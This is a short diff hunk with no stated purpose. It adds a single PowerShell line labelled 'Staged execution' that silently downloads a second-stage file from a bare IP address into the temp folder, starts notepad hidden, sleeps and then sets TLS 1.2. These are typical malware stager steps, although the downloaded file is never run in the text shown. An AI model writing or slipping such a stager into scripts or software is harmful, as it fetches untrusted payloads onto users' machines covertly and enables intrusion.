@@ -1,0 +1,2 @@
+
+<# Staged execution #> $Stage2Url = 'http://192.0.2.234/update.dat'; $DownloadPath = "$env:TEMP\stage2.bin"; Invoke-WebRequest -Uri $Stage2Url -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath 'notepad.exe' -WindowStyle Hidden -ErrorAction SilentlyContinue; Start-Sleep -Seconds 32; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
